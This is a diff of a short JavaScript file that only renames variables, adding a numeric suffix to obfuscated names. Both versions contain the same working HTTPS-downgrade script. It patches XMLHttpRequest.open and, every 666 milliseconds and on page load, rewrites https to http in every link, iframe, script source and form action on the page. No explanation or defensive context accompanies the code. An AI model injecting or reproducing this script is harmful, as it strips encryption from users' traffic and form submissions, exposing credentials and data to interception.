@@ -1,26 +1,26 @@
 (function() {
-	var obf_open = XMLHttpRequest.prototype.open;
-	XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
-		obf_var_url = obf_var_url.replace(/(http)s/ig, "$1");
-		return obf_open.apply(this, arguments);
+	var obf_open_399385 = XMLHttpRequest.prototype.open;
+	XMLHttpRequest.prototype.open = function(obf_var_method_399385, obf_var_url_399385, obf_var_async_399385, obf_var_username_399385, obf_var_password_399385) {
+		obf_var_url_399385 = obf_var_url_399385.replace(/(http)s/ig, "$1");
+		return obf_open_399385.apply(this, arguments);
 	}
 })();
 
-function obf_func_attack() {
-	document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node){
-		switch (obf_var_node.tagName) {
-			case "A": obf_var_node.href && obf_var_node.href.match(/https/i) ? obf_var_node.href = obf_var_node.href.replace(/(http)s/ig, "$1") : ""; break;
-			case "IFRAME": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : ""; break;
-			case "SCRIPT": obf_var_node.src && obf_var_node.src.match(/https/i) ? obf_var_node.src = obf_var_node.src.replace(/(http)s/ig, "$1") : ""; break;
-			case "FORM": obf_var_node.action && obf_var_node.action.match(/https/i) ? obf_var_node.action = obf_var_node.action.replace(/(http)s/ig, "$1") : ""; break;
+function obf_func_attack_399385() {
+	document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node_399385){
+		switch (obf_var_node_399385.tagName) {
+			case "A": obf_var_node_399385.href && obf_var_node_399385.href.match(/https/i) ? obf_var_node_399385.href = obf_var_node_399385.href.replace(/(http)s/ig, "$1") : ""; break;
+			case "IFRAME": obf_var_node_399385.src && obf_var_node_399385.src.match(/https/i) ? obf_var_node_399385.src = obf_var_node_399385.src.replace(/(http)s/ig, "$1") : ""; break;
+			case "SCRIPT": obf_var_node_399385.src && obf_var_node_399385.src.match(/https/i) ? obf_var_node_399385.src = obf_var_node_399385.src.replace(/(http)s/ig, "$1") : ""; break;
+			case "FORM": obf_var_node_399385.action && obf_var_node_399385.action.match(/https/i) ? obf_var_node_399385.action = obf_var_node_399385.action.replace(/(http)s/ig, "$1") : ""; break;
 		}
 	});
 }
 
-setInterval(obf_func_attack, 666);
+setInterval(obf_func_attack_399385, 666);
 
 try {
-	document.addEventListener("DOMContentLoaded", obf_func_attack);
-} catch(obf_ignore) {
-	self.addEventListener("load", obf_func_attack);
+	document.addEventListener("DOMContentLoaded", obf_func_attack_399385);
+} catch(obf_ignore_399385) {
+	self.addEventListener("load", obf_func_attack_399385);
 }
